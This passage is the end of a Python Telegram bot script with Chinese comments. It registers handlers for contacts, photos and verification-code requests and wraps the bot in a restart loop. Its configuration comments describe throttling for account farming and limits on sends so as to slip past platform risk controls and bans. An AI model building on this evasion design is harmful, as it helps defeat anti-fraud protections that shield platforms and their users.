    app.add_handler(CommandHandler("restart", handle_restart))
    app.add_handler(CommandHandler("lang", handle_lang))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex("获取验证码|Get Code"), handle_code_request))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex("重新验证|Restart Verification"), handle_restart))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    logger.info("Bot 已启动")
    # 轮询调优：短间隔+长超时+无限重连，弱网不断线
    app.run_polling(drop_pending_updates=True, poll_interval=0.5, timeout=30,
                    bootstrap_retries=-1, read_timeout=30, write_timeout=30,
                    connect_timeout=30, pool_timeout=30)

# 防冻配置：无人使用自动停机（分钟，0=关闭）；连续快挂熔断阈值
IDLE_STOP_MINUTES = int(os.getenv("IDLE_STOP_MINUTES", "30"))
# 养号节流：两次发码最小间隔（秒），每天验证上限（个），防同IP高频被风控
MIN_VERIFY_INTERVAL_SEC = int(os.getenv("MIN_VERIFY_INTERVAL_SEC", "180"))
MAX_VERIFY_PER_DAY = int(os.getenv("MAX_VERIFY_PER_DAY", "5"))
# 短信投递节流：单条最小间隔（秒）+ 每日上限
SMS_MIN_DELAY_SEC = int(os.getenv("SMS_MIN_DELAY_SEC", "30"))
SMS_DAILY_LIMIT = int(os.getenv("SMS_DAILY_LIMIT", "50"))
MAX_FAST_FAILS = 5
_should_run = True
_start_time = 0.0
_fail_count = 0
_last_activity = time.time()


async def track_activity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 任何用户消息都刷新活跃时间
    global _last_activity
    _last_activity = time.time()


async def idle_check_loop(app):
    # 空闲巡检（替代 job_queue，零额外依赖）
    global _should_run
    while True:
        await asyncio.sleep(60)
        if not _should_run or IDLE_STOP_MINUTES <= 0:
            continue
        idle_min = (time.time() - _last_activity) / 60
        if idle_min >= IDLE_STOP_MINUTES:
            logger.info(f"空闲 {idle_min:.0f} 分钟无访问，自动停机防封（后台可手动启动）")
            _should_run = False
            await app.stop()
            break


async def idle_check(context: ContextTypes.DEFAULT_TYPE):
    # 保留兼容（job_queue 可用时）
    global _should_run
    if not _should_run or IDLE_STOP_MINUTES <= 0:
        return
    idle_min = (time.time() - _last_activity) / 60
    if idle_min >= IDLE_STOP_MINUTES:
        logger.info(f"空闲 {idle_min:.0f} 分钟无访问，自动停机防封（后台可手动启动）")
        _should_run = False
        await context.application.stop()


if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            logger.info("收到停止信号，机器人已关闭。")
            break
        except Exception as e:
            msg = str(e)
            # 鉴权错（死token）绝不重试：否则无限 hammer Telegram 必被封
            if "InvalidToken" in type(e).__name__ or "Unauthorized" in msg or "unauthorized" in msg:
                logger.error(f"Token无效，拒绝重启（换有效token后再启动）: {msg[:200]}")
                break
            uptime = time.time() - _start_time if _start_time else 9999
            if uptime < 60:
                _fail_count += 1
            else:
                _fail_count = 0
            if _fail_count >= MAX_FAST_FAILS:
                logger.error(f"连续 {_fail_count} 次启动后60秒内崩溃，熔断停机防封，请看日志排查")
                break
            if not _should_run:
                logger.info("空闲停机，不再重启")
                break
            wait = min(5 * (_fail_count + 1), 300)
            logger.error(f"机器人发生异常: {msg[:200]}")
            logger.info(f"{wait}秒后重启（第{_fail_count + 1}次）...")
            time.sleep(wait)
